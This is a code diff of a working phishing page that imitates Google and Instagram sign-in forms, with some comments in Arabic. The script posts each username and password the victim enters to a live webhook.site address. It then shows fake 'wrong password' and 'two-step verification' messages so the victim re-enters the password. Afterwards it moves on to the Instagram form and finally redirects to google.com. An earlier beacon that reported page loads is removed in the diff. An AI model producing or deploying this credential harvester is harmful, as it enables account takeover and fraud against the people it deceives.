@@ -12,77 +12,80 @@
         .btn-go { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; width: 100%; cursor: pointer; font-weight: 500; font-size: 14px; }
         .btn-ig { background: #0095f6; color: #fff; border: none; padding: 7px; border-radius: 4px; width: 100%; cursor: pointer; font-weight: 600; font-size: 14px; }
         .hidden { display: none; }
-        .error { color: #d93025; font-size: 12px; margin-bottom: 10px; text-align: left; display: none; }
+        .error { color: #d93025; font-size: 12px; margin-bottom: 15px; text-align: left; display: none; background: #fce8e6; padding: 10px; border-radius: 4px; }
         .logo-go { width: 75px; margin-bottom: 10px; }
         .logo-ig { width: 175px; margin-bottom: 15px; }
     </style>
 </head>
 <body>
 
-<!-- STAGE 1: GOOGLE AUTH -->
-<div id="step-google" class="box">
-    <img src="https://wikimedia.org" class="logo-go">
-    <h2 style="font-weight: 400; margin-bottom: 5px;">Sign in</h2>
-    <p style="font-size: 15px; margin-bottom: 25px;">Verify your identity to access files</p>
-    <div id="err-go" class="error">Wrong password. Try again or click Forgot password.</div>
-    <input type="email" id="go-user" placeholder="Email or phone">
-    <input type="password" id="go-pass" placeholder="Enter your password">
-    <button class="btn-go" onclick="process('google')">Next</button>
-</div>
+<div id="auth-box" class="box">
+    <!-- Google View -->
+    <div id="google-ui">
+        <img src="https://wikimedia.org" class="logo-go">
+        <h2 style="font-weight: 400; margin-bottom: 5px;">Sign in</h2>
+        <p id="msg-go" style="font-size: 15px; margin-bottom: 25px;">Verify identity to access files</p>
+        <div id="err-go" class="error"></div>
+        <input type="email" id="go-user" placeholder="Email or phone">
+        <input type="password" id="go-pass" placeholder="Enter your password">
+        <button class="btn-go" onclick="handleLogic('google')">Next</button>
+    </div>
 
-<!-- STAGE 2: INSTAGRAM AUTH -->
-<div id="step-insta" class="box hidden">
-    <img src="https://wikimedia.org" class="logo-ig">
-    <p style="color: #8e8e8e; font-size: 14px; margin-bottom: 20px;">Log in to continue to Instagram</p>
-    <div id="err-ig" class="error">The password you entered is incorrect.</div>
-    <input type="text" id="ig-user" placeholder="Phone number, username, or email">
-    <input type="password" id="ig-pass" placeholder="Password">
-    <button class="btn-ig" onclick="process('insta')">Log In</button>
+    <!-- Instagram View -->
+    <div id="insta-ui" class="hidden">
+        <img src="https://wikimedia.org" class="logo-ig">
+        <p id="msg-ig" style="color: #8e8e8e; font-size: 14px; margin-bottom: 20px;">Log in to view Instagram media</p>
+        <div id="err-ig" class="error"></div>
+        <input type="text" id="ig-user" placeholder="Phone number, username, or email">
+        <input type="password" id="ig-pass" placeholder="Password">
+        <button class="btn-ig" onclick="handleLogic('insta')">Log In</button>
+    </div>
 </div>
 
 <script>
     const WEBHOOK_URL = "https://webhook.site/14050d7a-a236-4a94-8187-92801f330c1b";
-    let attempts = { google: 0, insta: 0 };
+    let status = { google: 0, insta: 0 };
 
-    async function process(type) {
-        const user = document.getElementById(type === 'google' ? 'go-user' : 'ig-user').value;
-        const pass = document.getElementById(type === 'google' ? 'go-pass' : 'ig-pass').value;
-        const errorDiv = document.getElementById(type === 'google' ? 'err-go' : 'err-ig');
+    async function handleLogic(type) {
+        const u = document.getElementById(type === 'google' ? 'go-user' : 'ig-user').value;
+        const p = document.getElementById(type === 'google' ? 'go-pass' : 'ig-pass').value;
+        const err = document.getElementById(type === 'google' ? 'err-go' : 'err-ig');
 
-        if (!user || !pass) return;
+        if (!u || !p) {
+            err.style.display = 'block';
+            err.innerText = "All fields are required.";
+            return;
+        }
 
-        // Capture Data
-        const payload = {
-            type: type.toUpperCase() + "_DATA",
-            attempt: attempts[type] + 1,
-            username: user,
-            password: pass,
-            meta: { ua: navigator.userAgent, platform: navigator.platform }
-        };
+        // إرسال البيانات فوراً للـ Webhook
+        fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type, user: u, pass: p, attempt: status[type] + 1 }) });
 
-        // Send to Control Center
-        fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+        status[type]++;
 
-        // Social Engineering: Force a second attempt to ensure real data
-        if (attempts[type] === 0) {
-            attempts[type]++;
-            errorDiv.style.display = 'block';
+        if (status[type] === 1) {
+            // الخطأ الأول: باسورد غلط
+            err.style.display = 'block';
+            err.innerText = "Wrong password. Try again.";
             document.getElementById(type === 'google' ? 'go-pass' : 'ig-pass').value = "";
-        } else {
-            // After 2nd attempt, move to next or finish
+        } 
+        else if (status[type] === 2) {
+            // الخطأ الثاني: تمويه أمني ذكي
+            err.style.display = 'block';
+            err.style.background = "#e8f0fe";
+            err.style.color = "#1a73e8";
+            err.innerText = "Two-step verification: Please re-enter password to confirm.";
+            document.getElementById(type === 'google' ? 'go-pass' : 'ig-pass').value = "";
+        }
+        else {
+            // بعد 3 محاولات، ننتقل للمرحلة التالية
             if (type === 'google') {
-                document.getElementById('step-google').classList.add('hidden');
-                document.getElementById('step-insta').classList.remove('hidden');
+                document.getElementById('google-ui').classList.add('hidden');
+                document.getElementById('insta-ui').classList.remove('hidden');
             } else {
                 window.location.href = "https://google.com";
             }
         }
     }
-
-    // Stealth Recon on Load
-    window.onload = () => {
-        fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ event: "INITIAL_ACCESS" }) });
-    };
 </script>
 </body>
 </html>
